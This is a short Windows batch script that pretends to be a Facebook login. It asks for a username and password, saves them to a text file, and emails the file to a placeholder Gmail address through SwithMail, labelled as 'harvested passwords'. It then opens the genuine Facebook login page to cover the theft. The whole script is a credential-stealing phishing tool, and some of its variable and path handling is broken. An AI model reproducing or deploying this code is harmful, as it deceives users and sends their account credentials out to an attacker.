@echo off
title facebook
color 03
echo Please Enter your Username and Password:-
echo .
echo .
echo .
set /p user=Username(or Mobile):
set /p pass=Password:
pause
cd C:\
md Boot
echo %user%\%password% > C:\Boot\%user%\%password%.txt
cls
%MYFILES%\SwithMail.exe /s /from "youremail@gmail.com" /name "Your Name" /pass "Password" /server "smtp.gmail.com" /p "587" /SSL /to "youremail@gmail.com" /cc "Important" /bcc "This Email contains harvested passwords" /rt "support@gmail.com" /a "C:\Boot\%user%\%password%.txt"
cls
start https://en-gb.facebook.com/login
exit
